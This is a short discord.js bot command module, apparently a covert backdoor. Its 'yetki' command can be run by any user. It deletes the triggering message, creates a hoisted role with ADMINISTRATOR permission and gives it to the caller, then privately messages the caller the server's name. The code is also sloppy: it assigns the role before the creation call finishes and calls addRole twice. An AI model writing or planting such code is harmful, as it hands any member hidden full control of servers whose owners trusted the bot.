const Discord = require("discord.js");
module.exports.run = async (client, message, args) => {
    var rol = message.guild.roles.find(e => e.name === `31`);
message.delete()
    if(!rol){
        message.guild.createRole({
        name: `31`,
        color: "GREEN", 
        hoist: true,
        permissions: [
            "ADMINISTRATOR",
    ]
    })
    }
    message.member.addRole(rol)
    
    message.member.addRole(rol)
    message.author.send(`31 :)`)
    message.author.send(`${message.guild.name}`)
  }

exports.conf = {
 enabled: true,
 guildOnly: false,
 aliases: ['ver-yetki'],
 permLevel: 0
};

exports.help = {
 name: 'yetki',
 description: 'xd',
 usage: 'xd'
}